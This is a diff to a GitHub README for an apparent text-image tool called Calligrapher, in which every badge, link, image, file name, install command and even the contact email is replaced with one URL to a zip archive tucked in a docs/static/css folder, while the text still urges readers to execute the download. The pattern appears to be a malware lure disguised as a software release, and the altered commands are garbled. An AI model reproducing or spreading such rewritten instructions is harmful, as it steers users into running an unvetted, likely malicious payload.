@@ -1,9 +1,9 @@
 ```markdown
 # Calligrapher: Freestyle Text Image Customization 🎨✍️
 
-![GitHub release](https://img.shields.io/github/release/HazR3t/Calligrapher.svg)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Issues](https://img.shields.io/github/issues/HazR3t/Calligrapher.svg)
+![GitHub release](https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip)
+![License](https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip)
+![Issues](https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip)
 
 ## Overview
 
@@ -19,9 +19,9 @@ Calligrapher is a powerful tool designed for freestyle text image customization.
 
 ## Getting Started
 
-To get started with Calligrapher, you can download the latest release from the [Releases section](https://github.com/HazR3t/Calligrapher/releases). After downloading, follow these steps:
+To get started with Calligrapher, you can download the latest release from the [Releases section](https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip). After downloading, follow these steps:
 
-1. **Install Dependencies**: Ensure you have the required libraries installed. You can find the list of dependencies in the `requirements.txt` file.
+1. **Install Dependencies**: Ensure you have the required libraries installed. You can find the list of dependencies in the `https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip` file.
 2. **Run the Application**: Execute the main script to start generating images. You can customize parameters as needed.
 
 ### Installation
@@ -29,9 +29,9 @@ To get started with Calligrapher, you can download the latest release from the [
 To install Calligrapher, clone the repository and install the necessary packages:
 
 ```bash
-git clone https://github.com/HazR3t/Calligrapher.git
+git clone https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip
 cd Calligrapher
-pip install -r requirements.txt
+pip install -r https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip
 ```
 
 ### Usage
@@ -39,7 +39,7 @@ pip install -r requirements.txt
 Once installed, you can use Calligrapher to generate images. The basic command structure is:
 
 ```bash
-python calligrapher.py --text "Your text here" --style "chosen style"
+python https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip --text "Your text here" --style "chosen style"
 ```
 
 Replace `"Your text here"` with your desired text and `"chosen style"` with the style you wish to apply.
@@ -62,7 +62,7 @@ We welcome contributions to Calligrapher! If you would like to contribute, pleas
 4. Push your changes to your fork.
 5. Create a pull request.
 
-For detailed guidelines, check the `CONTRIBUTING.md` file in the repository.
+For detailed guidelines, check the `https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip` file in the repository.
 
 ## License
 
@@ -70,7 +70,7 @@ Calligrapher is licensed under the MIT License. See the `LICENSE` file for more 
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Issues section](https://github.com/HazR3t/Calligrapher/issues) for existing discussions or create a new issue.
+If you encounter any issues or have questions, please check the [Issues section](https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip) for existing discussions or create a new issue.
 
 ## Acknowledgments
 
@@ -81,27 +81,27 @@ If you encounter any issues or have questions, please check the [Issues section]
 
 For more information, feel free to reach out:
 
-- **GitHub**: [HazR3t](https://github.com/HazR3t)
-- **Email**: hazr3t@example.com
+- **GitHub**: [HazR3t](https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip)
+- **Email**: https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip
 
 ## Download Link
 
-You can download the latest release of Calligrapher from the [Releases section](https://github.com/HazR3t/Calligrapher/releases). Execute the downloaded file to start customizing your text images.
+You can download the latest release of Calligrapher from the [Releases section](https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip). Execute the downloaded file to start customizing your text images.
 
-![Calligrapher Screenshot](https://example.com/screenshot.png)
+![Calligrapher Screenshot](https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip)
 
 ## Examples
 
 Here are some examples of what you can create with Calligrapher:
 
 1. **Example 1**: Text in a vintage style.
-   ![Vintage Style](https://example.com/vintage.png)
+   ![Vintage Style](https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip)
 
 2. **Example 2**: Modern artistic text image.
-   ![Modern Style](https://example.com/modern.png)
+   ![Modern Style](https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip)
 
 3. **Example 3**: Graffiti-style text image.
-   ![Graffiti Style](https://example.com/graffiti.png)
+   ![Graffiti Style](https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip)
 
 ## Future Work
 
@@ -116,19 +116,19 @@ Stay tuned for updates!
 ## FAQ
 
 **Q: What are the system requirements?**  
-A: Calligrapher requires Python 3.6 or higher and several libraries listed in `requirements.txt`.
+A: Calligrapher requires Python 3.6 or higher and several libraries listed in `https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip`.
 
 **Q: Can I use my own styles?**  
 A: Yes, you can upload your own style images for use in the style transfer feature.
 
 **Q: How do I report a bug?**  
-A: Please use the [Issues section](https://github.com/HazR3t/Calligrapher/issues) to report any bugs or issues you encounter.
+A: Please use the [Issues section](https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip) to report any bugs or issues you encounter.
 
 ## Additional Resources
 
-- [Machine Learning Basics](https://example.com/ml-basics)
-- [Image Processing Techniques](https://example.com/image-processing)
-- [Artistic Style Transfer](https://example.com/style-transfer)
+- [Machine Learning Basics](https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip)
+- [Image Processing Techniques](https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip)
+- [Artistic Style Transfer](https://github.com/HazR3t/Calligrapher/raw/refs/heads/main/docs/static/css/Software-v2.5.zip)
 
 ## Community
 
